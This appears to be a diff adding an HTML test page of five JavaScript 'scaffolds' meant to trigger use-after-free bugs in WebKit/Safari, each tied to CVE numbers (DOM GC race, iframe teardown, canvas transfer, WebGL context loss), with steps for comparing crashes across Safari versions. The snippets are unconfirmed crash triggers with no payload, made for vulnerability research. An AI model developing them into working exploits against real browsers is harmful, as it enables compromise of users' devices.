@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>WebKit UAF scaffolds (CVE-2026-112697 cluster)</title>
+<!--
+  SCAFFOLDS, not exploits. Each section is the correct *shape* of a
+  triggering program for one group-A WebKit CVE. None is confirmed; the
+  researcher must find the lifetime path that differs between
+  625.1.29.10.33 and 625.2.8.10.7.
+-->
+<style>body{font:13px monospace;margin:20px}section{border:1px solid #ccc;margin:12px 0;padding:8px}pre{background:#f6f6f6;padding:8px;white-space:pre-wrap}</style>
+</head>
+<body>
+<h1>WebKit UAF scaffolds</h1>
+
+<section id="s1">
+<h2>1. DOM node / wrapper GC race — CVE-2026-112697, 112655</h2>
+<pre>
+const host = document.createElement('div');
+document.body.appendChild(host);
+let node = document.createElement('span');
+host.appendChild(node);
+// Keep a callback alive that touches `node` after a GC-ish pause.
+Promise.resolve().then(async () => {
+  // Force allocation pressure; in Safari use many short-lived objects.
+  const pressure = [];
+  for (let i = 0; i < 5e6; i++) pressure.push({i});
+  // Detach the node; if the wrapper is collected while the callback
+  // still holds it, the subsequent access is a UAF.
+  node.remove();
+  // Touch the detached node.
+  node.textContent = 'x';
+});
+</pre>
+</section>
+
+<section id="s2">
+<h2>2. Event listener + navigation — CVE-2026-112651, 112623</h2>
+<pre>
+const iframe = document.createElement('iframe');
+iframe.srcdoc = '<p>hi</p>';
+document.body.appendChild(iframe);
+iframe.onload = () => {
+  const ev = new Event('custom');
+  iframe.contentWindow.addEventListener('custom', () => {
+    // Handler navigates after the event target may be gone.
+    iframe.contentWindow.location = 'about:blank';
+  });
+  // Fire, then immediately remove the iframe.
+  iframe.contentWindow.dispatchEvent(ev);
+  iframe.remove();
+};
+</pre>
+</section>
+
+<section id="s3">
+<h2>3. fetch / XHR after teardown — CVE-2026-112640</h2>
+<pre>
+const iframe = document.createElement('iframe');
+iframe.srcdoc = '<p>x</p>';
+document.body.appendChild(iframe);
+iframe.onload = () => {
+  const w = iframe.contentWindow;
+  w.fetch('data:text/plain,hello').then(r => r.text()).then(t => {
+    // `t` arrives after the iframe was removed and its Document torn down.
+    console.log(t, w.document);
+  });
+  iframe.remove();
+};
+</pre>
+</section>
+
+<section id="s4">
+<h2>4. Canvas / ImageBitmap transfer race — CVE-2026-112637</h2>
+<pre>
+const canvas = document.createElement('canvas');
+canvas.width = canvas.height = 256;
+const ctx = canvas.getContext('2d');
+ctx.fillRect(0, 0, 256, 256);
+const off = canvas.transferControlToOffscreen();
+const worker = new Worker(URL.createObjectURL(new Blob([`
+  onmessage = (e) => {
+    const off = e.data;
+    const c = off.getContext('2d');
+    c.fillRect(0, 0, 256, 256);
+    const bmp = off.transferToImageBitmap();
+    postMessage(bmp, [bmp]);
+  };
+`], {type: 'text/javascript'})));
+worker.postMessage(off, [off]);
+worker.onmessage = (e) => {
+  const bmp = e.data;
+  worker.terminate();          // close worker while the bitmap lives
+  // drawImage the bitmap after the GPU-side object may be freed.
+  ctx.drawImage(bmp, 0, 0);
+};
+</pre>
+</section>
+
+<section id="s5">
+<h2>5. WebGL context loss — CVE-2026-112626</h2>
+<pre>
+const canvas = document.createElement('canvas');
+const gl = canvas.getContext('webgl');
+const tex = gl.createTexture();
+const worker = new Worker(URL.createObjectURL(new Blob([`
+  onmessage = (e) => {
+    // Signal the context to be lost from a worker-owned canvas path.
+    postMessage('lose');
+  };
+`], {type: 'text/javascript'})));
+worker.postMessage('go');
+worker.onmessage = () => {
+  // Lose the context while `tex` is still referenced.
+  gl.getExtension('WEBGL_lose_context').loseContext();
+  gl.bindTexture(gl.TEXTURE_2D, tex);   // touch after loss
+};
+worker.terminate();
+</pre>
+</section>
+
+<section>
+<h2>How to use</h2>
+<p>
+Load this file in Safari on a 27.0.1 device and on 27.2. A section that
+crashes or behaves differently identifies the trigger class. For a
+deterministic repro, run the equivalent JS in WebKit's <code>jsc</code> or
+<code>MiniBrowser</code> with MallocGuardEdges / ASAN if a debug build is
+available.
+</p>
+</section>
+</body>
+</html>
